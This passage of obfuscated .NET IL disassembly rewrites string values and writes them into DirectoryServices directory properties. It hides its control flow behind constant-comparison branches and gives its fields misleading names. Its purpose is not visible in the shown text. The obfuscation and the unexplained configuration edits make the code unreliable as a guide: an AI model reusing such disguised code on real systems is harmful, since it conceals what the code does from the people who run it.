        IL_0472:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
        IL_0477:  ldsfld     string _Exception
        IL_047c:  ldloc.s    V_24
        IL_047e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0483:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                               !0)
        IL_0488:  ldloca.s   V_23
        IL_048a:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_048f:  brtrue.s   IL_0439

        IL_0491:  leave      IL_04a4

      }  // end .try
      finally
      {
        IL_0496:  ldloca.s   V_23
        IL_0498:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_049e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_04a3:  endfinally
      }  // end handler
      IL_04a4:  ldloc.s    V_17
      IL_04a6:  ldc.i4.1
      IL_04a7:  call       int32 '<Module>'(int32)
      IL_04ac:  add
      IL_04ad:  stloc.s    V_17
      IL_04af:  ldloc.s    V_17
      IL_04b1:  ldc.i4     0x3264b012
      IL_04b6:  stloc.s    V_27
      IL_04b8:  ldloc.s    V_27
      IL_04ba:  ldc.i4     0x38af2569
      IL_04bf:  beq        IL_04ca

      IL_04c4:  ldarg.0
      IL_04c5:  br         IL_04d3

      IL_04ca:  nop
      IL_04cb:  ldloc.s    V_14
      IL_04cd:  br         IL_04d3

      IL_04d2:  nop
      IL_04d3:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_04d8:  blt        IL_0367

      IL_04dd:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_04e2:  stloc.s    V_28
      IL_04e4:  ldc.i4.0
      IL_04e5:  stloc.s    V_29
      IL_04e7:  br         IL_05d3

      IL_04ec:  ldloc.s    V_14
      IL_04ee:  ldc.i4     0x76767616
      IL_04f3:  stloc.s    V_30
      IL_04f5:  ldloc.s    V_30
      IL_04f7:  ldc.i4     0x40801def
      IL_04fc:  beq        IL_0507

      IL_0501:  ldarg.0
      IL_0502:  br         IL_0510

      IL_0507:  nop
      IL_0508:  ldloc.s    V_29
      IL_050a:  br         IL_0510

      IL_050f:  nop
      IL_0510:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0515:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_051a:  brtrue     IL_051f

      IL_051f:  ldloc.s    V_14
      IL_0521:  ldc.i4     0x267a71e5
      IL_0526:  stloc.s    V_31
      IL_0528:  ldloc.s    V_31
      IL_052a:  ldc.i4     0x6f66b2ab
      IL_052f:  beq        IL_053a

      IL_0534:  ldarg.0
      IL_0535:  br         IL_0543

      IL_053a:  nop
      IL_053b:  ldloc.s    V_29
      IL_053d:  br         IL_0543

      IL_0542:  nop
      IL_0543:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0548:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_054d:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0552:  stloc.s    V_32
      IL_0554:  ldsfld     string Exception
      IL_0559:  stloc.s    V_33
      IL_055b:  ldc.i4.0
      IL_055c:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0561:  ldlen
      IL_0562:  add
      IL_0563:  stloc.s    V_34
      IL_0565:  br         IL_05a4

      IL_056a:  ldloc.s    V_32
      IL_056c:  ldloc.s    V_34
      IL_056e:  ldelem     [mscorlib]System.String
      IL_0573:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0578:  brtrue     IL_0599

      IL_057d:  ldloc.s    V_33
      IL_057f:  ldsfld     string DateTime
      IL_0584:  ldloc.s    V_32
      IL_0586:  ldloc.s    V_34
      IL_0588:  ldelem     [mscorlib]System.String
      IL_058d:  ldsfld     string DateTimeKind
      IL_0592:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0597:  stloc.s    V_33
      IL_0599:  ldloc.s    V_34
      IL_059b:  ldc.i4.1
      IL_059c:  call       int32 '<Module>'(int32)
      IL_05a1:  add
      IL_05a2:  stloc.s    V_34
      IL_05a4:  ldloc.s    V_34
      IL_05a6:  ldloc.s    V_32
      IL_05a8:  ldlen
      IL_05a9:  conv.i4
      IL_05aa:  blt.s      IL_056a

      IL_05ac:  ldsfld     string IDeserializationCallback
      IL_05b1:  ldloc.s    V_33
      IL_05b3:  ldsfld     string DateTimeOffset
      IL_05b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_05bd:  stloc.s    V_33
      IL_05bf:  ldloc.s    V_28
      IL_05c1:  ldloc.s    V_33
      IL_05c3:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_05c8:  ldloc.s    V_29
      IL_05ca:  ldc.i4.1
      IL_05cb:  call       int32 '<Module>'(int32)
      IL_05d0:  add
      IL_05d1:  stloc.s    V_29
      IL_05d3:  ldloc.s    V_29
      IL_05d5:  ldc.i4     0x639adc24
      IL_05da:  stloc.s    V_35
      IL_05dc:  ldloc.s    V_35
      IL_05de:  ldc.i4     0x56a16ed6
      IL_05e3:  beq        IL_05ee

      IL_05e8:  ldarg.0
      IL_05e9:  br         IL_05f7

      IL_05ee:  nop
      IL_05ef:  ldloc.s    V_14
      IL_05f1:  br         IL_05f7

      IL_05f6:  nop
      IL_05f7:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_05fc:  blt        IL_04ec

      IL_0601:  ldsfld     string SystemException
      IL_0606:  ldloc.s    V_28
      IL_0608:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<string>::ToArray()
      IL_060d:  call       string [mscorlib]System.String::Join(string,
                                                                string[])
      IL_0612:  stloc.s    V_36
      IL_0614:  ldloc.s    V_11
      IL_0616:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_061b:  ldloc.s    V_4
      IL_061d:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_0622:  ldloc.s    V_36
      IL_0624:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
      IL_0629:  br         IL_0833

      IL_062e:  ldloc.s    V_11
      IL_0630:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0635:  ldloc.s    V_4
      IL_0637:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_063c:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_0641:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0646:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_064b:  stloc.s    V_37
      IL_064d:  ldloc.s    V_12
      IL_064f:  ldsfld     string OutOfMemoryException
      IL_0654:  ldloc.s    V_13
      IL_0656:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_065b:  stloc.s    V_38
      IL_065d:  ldc.i4.1
      IL_065e:  call       int32 '<Module>'(int32)
      IL_0663:  newarr     [mscorlib]System.Char
      IL_0668:  dup
      IL_0669:  ldc.i4.0
      IL_066a:  ldc.i4.s   91
      IL_066c:  stelem.i2
      IL_066d:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0672:  stloc.s    V_5
      IL_0674:  ldc.i4.0
      IL_0675:  stloc.s    V_6
      IL_0677:  br         IL_06c8

      IL_067c:  ldloc.s    V_5
      IL_067e:  ldloc.s    V_6
      IL_0680:  ldelem     [mscorlib]System.String
      IL_0685:  stloc.s    V_39
      IL_0687:  ldloc.s    V_37
      IL_0689:  ldloc.s    V_39
      IL_068b:  ldsfld     string StackOverflowException
      IL_0690:  ldsfld     string DataMisalignedException
      IL_0695:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_069a:  ldsfld     string ExecutionEngineException
      IL_069f:  ldsfld     string Delegate
      IL_06a4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_06a9:  ldsfld     string DelegateBindingFlags
      IL_06ae:  ldsfld     string MulticastDelegate
      IL_06b3:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_06b8:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_06bd:  ldloc.s    V_6
      IL_06bf:  ldc.i4.1
      IL_06c0:  call       int32 '<Module>'(int32)
      IL_06c5:  add
      IL_06c6:  stloc.s    V_6
      IL_06c8:  ldloc.s    V_6
      IL_06ca:  ldloc.s    V_5
      IL_06cc:  ldlen
      IL_06cd:  conv.i4
      IL_06ce:  blt.s      IL_067c

      IL_06d0:  ldloc.s    V_37
      IL_06d2:  ldloc.s    V_38
      IL_06d4:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_06d9:  ldloc.s    V_37
      IL_06db:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Sort()
      IL_06e0:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_06e5:  stloc.s    V_40
      IL_06e7:  ldc.i4.0
      IL_06e8:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_06ed:  ldlen
      IL_06ee:  sub
      IL_06ef:  stloc.s    V_41
      IL_06f1:  br         IL_07dd

      IL_06f6:  ldloc.s    V_37
      IL_06f8:  ldc.i4     0x393b9d7f
      IL_06fd:  stloc.s    V_42
      IL_06ff:  ldloc.s    V_42
      IL_0701:  ldc.i4     0x79f1d37e
      IL_0706:  beq        IL_0711

      IL_070b:  ldarg.0
      IL_070c:  br         IL_071a

      IL_0711:  nop
      IL_0712:  ldloc.s    V_41
      IL_0714:  br         IL_071a

      IL_0719:  nop
      IL_071a:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_071f:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0724:  brtrue     IL_0729

      IL_0729:  ldloc.s    V_37
      IL_072b:  ldc.i4     0xfd00b02
      IL_0730:  stloc.s    V_43
      IL_0732:  ldloc.s    V_43
      IL_0734:  ldc.i4     0x3f6de395
      IL_0739:  beq        IL_0744

      IL_073e:  ldarg.0
      IL_073f:  br         IL_074d

      IL_0744:  nop
      IL_0745:  ldloc.s    V_41
      IL_0747:  br         IL_074d

      IL_074c:  nop
      IL_074d:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0752:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_0757:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_075c:  stloc.s    V_44
      IL_075e:  ldsfld     string __Filters
      IL_0763:  stloc.s    V_45
      IL_0765:  ldc.i4.0
      IL_0766:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_076b:  ldlen
      IL_076c:  add
      IL_076d:  stloc.s    V_46
      IL_076f:  br         IL_07ae

      IL_0774:  ldloc.s    V_44
      IL_0776:  ldloc.s    V_46
      IL_0778:  ldelem     [mscorlib]System.String
      IL_077d:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0782:  brtrue     IL_07a3

      IL_0787:  ldloc.s    V_45
      IL_0789:  ldsfld     string __HResults
      IL_078e:  ldloc.s    V_44
      IL_0790:  ldloc.s    V_46
      IL_0792:  ldelem     [mscorlib]System.String
      IL_0797:  ldsfld     string LogLevel
      IL_079c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_07a1:  stloc.s    V_45
      IL_07a3:  ldloc.s    V_46
      IL_07a5:  ldc.i4.1
      IL_07a6:  call       int32 '<Module>'(int32)
      IL_07ab:  add
      IL_07ac:  stloc.s    V_46
      IL_07ae:  ldloc.s    V_46
      IL_07b0:  ldloc.s    V_44
      IL_07b2:  ldlen
      IL_07b3:  conv.i4
      IL_07b4:  blt.s      IL_0774

      IL_07b6:  ldsfld     string SwitchStructure
      IL_07bb:  ldloc.s    V_45
      IL_07bd:  ldsfld     string BCLDebug
      IL_07c2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_07c7:  stloc.s    V_45
      IL_07c9:  ldloc.s    V_40
      IL_07cb:  ldloc.s    V_45
      IL_07cd:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_07d2:  ldloc.s    V_41
      IL_07d4:  ldc.i4.1
      IL_07d5:  call       int32 '<Module>'(int32)
      IL_07da:  add
      IL_07db:  stloc.s    V_41
      IL_07dd:  ldloc.s    V_41
      IL_07df:  ldc.i4     0x1e3fcc31
      IL_07e4:  stloc.s    V_47
      IL_07e6:  ldloc.s    V_47
      IL_07e8:  ldc.i4     0x3e75e60a
      IL_07ed:  beq        IL_07f8

      IL_07f2:  ldarg.0
      IL_07f3:  br         IL_0801

      IL_07f8:  nop
      IL_07f9:  ldloc.s    V_37
      IL_07fb:  br         IL_0801

      IL_0800:  nop
      IL_0801:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_0806:  blt        IL_06f6

      IL_080b:  ldsfld     string MemberAccessException
      IL_0810:  ldloc.s    V_40
      IL_0812:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<string>::ToArray()
      IL_0817:  call       string [mscorlib]System.String::Join(string,
                                                                string[])
      IL_081c:  stloc.s    V_48
      IL_081e:  ldloc.s    V_11
      IL_0820:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0825:  ldloc.s    V_4
      IL_0827:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_082c:  ldloc.s    V_48
      IL_082e:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
      IL_0833:  leave      IL_087e

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_0838:  pop
      IL_0839:  ldloc.s    V_11
      IL_083b:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_0840:  ldloc.s    V_4
      IL_0842:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_0847:  ldc.i4.5
      IL_0848:  newarr     [mscorlib]System.String
      IL_084d:  dup
      IL_084e:  ldc.i4.0
      IL_084f:  ldsfld     string _Activator
      IL_0854:  stelem.ref
      IL_0855:  dup
      IL_0856:  ldc.i4.1
      IL_0857:  ldloc.s    V_12
      IL_0859:  stelem.ref
      IL_085a:  dup
      IL_085b:  ldc.i4.2
      IL_085c:  ldsfld     string Activator
      IL_0861:  stelem.ref
      IL_0862:  dup
      IL_0863:  ldc.i4.3
      IL_0864:  ldloc.s    V_13
      IL_0866:  stelem.ref
      IL_0867:  dup
      IL_0868:  ldc.i4.4
      IL_0869:  ldsfld     string AccessViolationException
      IL_086e:  stelem.ref
      IL_086f:  call       string [mscorlib]System.String::Concat(string[])
      IL_0874:  callvirt   instance void [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::set_Value(object)
      IL_0879:  leave      IL_087e

    }  // end handler
    IL_087e:  ldarg.s    ISTORE_BIND_REFERENCE_TO_ASSEMBLY_FLAGS
    IL_0880:  ldsfld     string ManifestRunner
    IL_0885:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_088a:  brfalse    IL_0e94

    IL_088f:  ldsfld     string ApplicationActivator
    IL_0894:  stloc.s    V_12
    IL_0896:  ldsfld     string ApplicationException
    IL_089b:  stloc.s    V_13
    IL_089d:  ldsfld     string EventArgs
    IL_08a2:  stloc.s    V_49
    .try
    {
      IL_08a4:  ldloc.s    V_11
      IL_08a6:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_08ab:  ldloc.s    V_4
      IL_08ad:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_08b2:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_08b7:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_08bc:  ldloc.s    V_13
      IL_08be:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_08c3:  brtrue     IL_0e2e

      IL_08c8:  ldloc.s    V_11
      IL_08ca:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyCollection [System.DirectoryServices]System.DirectoryServices.DirectoryEntry::get_Properties()
      IL_08cf:  ldloc.s    V_4
      IL_08d1:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection [System.DirectoryServices]System.DirectoryServices.PropertyCollection::get_Item(string)
      IL_08d6:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.PropertyValueCollection::get_Value()
      IL_08db:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_08e0:  stloc.s    V_50
      IL_08e2:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_08e7:  stloc.s    V_51
      IL_08e9:  ldloc.s    V_50
      IL_08eb:  ldc.i4.1
      IL_08ec:  call       int32 '<Module>'(int32)
      IL_08f1:  newarr     [mscorlib]System.Char
      IL_08f6:  dup
      IL_08f7:  ldc.i4.0
      IL_08f8:  ldc.i4.s   91
      IL_08fa:  stelem.i2
      IL_08fb:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0900:  stloc.s    V_5
      IL_0902:  ldc.i4.0
      IL_0903:  stloc.s    V_6
      IL_0905:  br         IL_0956

      IL_090a:  ldloc.s    V_5
      IL_090c:  ldloc.s    V_6
      IL_090e:  ldelem     [mscorlib]System.String
      IL_0913:  stloc.s    V_52
      IL_0915:  ldloc.s    V_51
      IL_0917:  ldloc.s    V_52
      IL_0919:  ldsfld     string ResolveEventArgs
      IL_091e:  ldsfld     string AssemblyLoadEventArgs
      IL_0923:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0928:  ldsfld     string ResolveEventHandler
      IL_092d:  ldsfld     string AssemblyLoadEventHandler
      IL_0932:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0937:  ldsfld     string AppDomainInitializer
      IL_093c:  ldsfld     string AppDomainInitializerInfo
      IL_0941:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0946:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_094b:  ldloc.s    V_6
      IL_094d:  ldc.i4.1
      IL_094e:  call       int32 '<Module>'(int32)
      IL_0953:  add
      IL_0954:  stloc.s    V_6
      IL_0956:  ldloc.s    V_6
      IL_0958:  ldloc.s    V_5
      IL_095a:  ldlen
      IL_095b:  conv.i4
      IL_095c:  blt.s      IL_090a

      IL_095e:  ldloc.s    V_50
      IL_0960:  ldloc.s    V_12
      IL_0962:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0967:  brtrue     IL_0986

      IL_096c:  ldloc.s    V_51
      IL_096e:  ldloc.s    V_12
      IL_0970:  ldsfld     string MarshalByRefObject
      IL_0975:  ldloc.s    V_13
      IL_0977:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_097c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0981:  br         IL_0b19

      IL_0986:  ldloc.s    V_50
      IL_0988:  ldloc.s    V_12
      IL_098a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_098f:  brfalse    IL_0b19

      IL_0994:  ldc.i4.0
      IL_0995:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_099a:  ldlen
      IL_099b:  sub
      IL_099c:  stloc.s    V_53
      IL_099e:  br         IL_0aeb

      IL_09a3:  ldloc.s    V_51
      IL_09a5:  ldc.i4     0xf1be47a
      IL_09aa:  stloc.s    V_54
      IL_09ac:  ldloc.s    V_54
      IL_09ae:  ldc.i4     0x2293691a
      IL_09b3:  beq        IL_09be

      IL_09b8:  ldarg.0
      IL_09b9:  br         IL_09c7

      IL_09be:  nop
      IL_09bf:  ldloc.s    V_53
      IL_09c1:  br         IL_09c7

      IL_09c6:  nop
      IL_09c7:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_09cc:  ldloc.s    V_12
      IL_09ce:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_09d3:  brfalse    IL_0ae0

      IL_09d8:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_09dd:  stloc.s    V_55
      IL_09df:  ldloc.s    V_51
      IL_09e1:  ldc.i4     0x76b980c4
      IL_09e6:  stloc.s    V_56
      IL_09e8:  ldloc.s    V_56
      IL_09ea:  ldc.i4     0x5c675008
      IL_09ef:  beq        IL_09fa

      IL_09f4:  ldarg.0
      IL_09f5:  br         IL_0a03

      IL_09fa:  nop
      IL_09fb:  ldloc.s    V_53
      IL_09fd:  br         IL_0a03

      IL_0a02:  nop
      IL_0a03:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0a08:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_0a0d:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0a12:  stloc.s    V_57
      IL_0a14:  ldc.i4.1
      IL_0a15:  call       int32 '<Module>'(int32)
      IL_0a1a:  stloc.s    V_58
      IL_0a1c:  br         IL_0a37

      IL_0a21:  ldloc.s    V_55
      IL_0a23:  ldloc.s    V_57
      IL_0a25:  ldloc.s    V_58
      IL_0a27:  ldelem     [mscorlib]System.String
      IL_0a2c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0a31:  ldloc.s    V_58
      IL_0a33:  ldc.i4.1
      IL_0a34:  add
      IL_0a35:  stloc.s    V_58
      IL_0a37:  ldloc.s    V_58
      IL_0a39:  ldloc.s    V_57
      IL_0a3b:  ldlen
      IL_0a3c:  conv.i4
      IL_0a3d:  blt.s      IL_0a21

      IL_0a3f:  ldloc.s    V_55
      IL_0a41:  ldloc.s    V_13
      IL_0a43:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0a48:  ldloc.s    V_55
      IL_0a4a:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Sort()
      IL_0a4f:  ldloc.s    V_51
      IL_0a51:  ldloc.s    V_53
      IL_0a53:  ldloc.s    V_57
      IL_0a55:  ldc.i4.0
      IL_0a56:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0a5b:  ldlen
      IL_0a5c:  sub
      IL_0a5d:  ldelem     [mscorlib]System.String
      IL_0a62:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                             !0)
      IL_0a67:  ldloc.s    V_55
      IL_0a69:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_0a6e:  stloc.s    V_23
      .try
      {
        IL_0a70:  br         IL_0ac4

        IL_0a75:  ldloca.s   V_23
        IL_0a77:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_0a7c:  stloc.s    V_59
        IL_0a7e:  ldloc.s    V_51
        IL_0a80:  stloc.s    V_25
        IL_0a82:  ldloc.s    V_53
        IL_0a84:  stloc.s    V_6
        IL_0a86:  ldloc.s    V_25
        IL_0a88:  ldloc.s    V_6
        IL_0a8a:  ldloc.s    V_25
        IL_0a8c:  ldc.i4     0xd7154bb
        IL_0a91:  stloc.s    V_60
        IL_0a93:  ldloc.s    V_60
        IL_0a95:  ldc.i4     0x69fa228e
        IL_0a9a:  beq        IL_0aa5

        IL_0a9f:  ldarg.0
        IL_0aa0:  br         IL_0aae

        IL_0aa5:  nop
        IL_0aa6:  ldloc.s    V_6
        IL_0aa8:  br         IL_0aae

        IL_0aad:  nop
        IL_0aae:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
        IL_0ab3:  ldsfld     string _AppDomain
        IL_0ab8:  ldloc.s    V_59
        IL_0aba:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0abf:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::set_Item(int32,
                                                                                                               !0)
        IL_0ac4:  ldloca.s   V_23
        IL_0ac6:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_0acb:  brtrue.s   IL_0a75

        IL_0acd:  leave      IL_0ae0

      }  // end .try
      finally
      {
        IL_0ad2:  ldloca.s   V_23
        IL_0ad4:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_0ada:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0adf:  endfinally
      }  // end handler
      IL_0ae0:  ldloc.s    V_53
      IL_0ae2:  ldc.i4.1
      IL_0ae3:  call       int32 '<Module>'(int32)
      IL_0ae8:  add
      IL_0ae9:  stloc.s    V_53
      IL_0aeb:  ldloc.s    V_53
      IL_0aed:  ldc.i4     0x68f5545b
      IL_0af2:  stloc.s    V_61
      IL_0af4:  ldloc.s    V_61
      IL_0af6:  ldc.i4     0x480aabcf
      IL_0afb:  beq        IL_0b06

      IL_0b00:  ldarg.0
      IL_0b01:  br         IL_0b0f

      IL_0b06:  nop
      IL_0b07:  ldloc.s    V_51
      IL_0b09:  br         IL_0b0f

      IL_0b0e:  nop
      IL_0b0f:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<string>::get_Count()
      IL_0b14:  blt        IL_09a3

      IL_0b19:  ldloc.s    V_50
      IL_0b1b:  ldloc.s    V_49
      IL_0b1d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0b22:  brtrue     IL_0b41

      IL_0b27:  ldloc.s    V_51
      IL_0b29:  ldloc.s    V_49
      IL_0b2b:  ldsfld     string IEvidenceFactory
      IL_0b30:  ldloc.s    V_13
      IL_0b32:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0b37:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0b3c:  br         IL_0cd4

      IL_0b41:  ldloc.s    V_50
      IL_0b43:  ldloc.s    V_49
      IL_0b45:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0b4a:  brfalse    IL_0cd4

      IL_0b4f:  ldc.i4.0
      IL_0b50:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0b55:  ldlen
      IL_0b56:  add
      IL_0b57:  stloc.s    V_62
      IL_0b59:  br         IL_0ca6

      IL_0b5e:  ldloc.s    V_51
      IL_0b60:  ldc.i4     0x29007926
      IL_0b65:  stloc.s    V_63
      IL_0b67:  ldloc.s    V_63
      IL_0b69:  ldc.i4     0x59f6dfd8
      IL_0b6e:  beq        IL_0b79

      IL_0b73:  ldarg.0
      IL_0b74:  br         IL_0b82

      IL_0b79:  nop
      IL_0b7a:  ldloc.s    V_62
      IL_0b7c:  br         IL_0b82

      IL_0b81:  nop
      IL_0b82:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0b87:  ldloc.s    V_49
      IL_0b89:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0b8e:  brfalse    IL_0c9b

      IL_0b93:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_0b98:  stloc.s    V_64
      IL_0b9a:  ldloc.s    V_51
      IL_0b9c:  ldc.i4     0x339f5ca1
      IL_0ba1:  stloc.s    V_65
      IL_0ba3:  ldloc.s    V_65
      IL_0ba5:  ldc.i4     0x743ca729
      IL_0baa:  beq        IL_0bb5

      IL_0baf:  ldarg.0
      IL_0bb0:  br         IL_0bbe

      IL_0bb5:  nop
      IL_0bb6:  ldloc.s    V_62
      IL_0bb8:  br         IL_0bbe

      IL_0bbd:  nop
      IL_0bbe:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<string>::get_Item(int32)
      IL_0bc3:  call       !!0[] [mscorlib]System.Array::Empty<char>()
      IL_0bc8:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0bcd:  stloc.s    V_66
      IL_0bcf:  ldc.i4.1
      IL_0bd0:  call       int32 '<Module>'(int32)
      IL_0bd5:  stloc.s    V_67
      IL_0bd7:  br         IL_0bf2

      IL_0bdc:  ldloc.s    V_64
      IL_0bde:  ldloc.s    V_66
      IL_0be0:  ldloc.s    V_67
      IL_0be2:  ldelem     [mscorlib]System.String
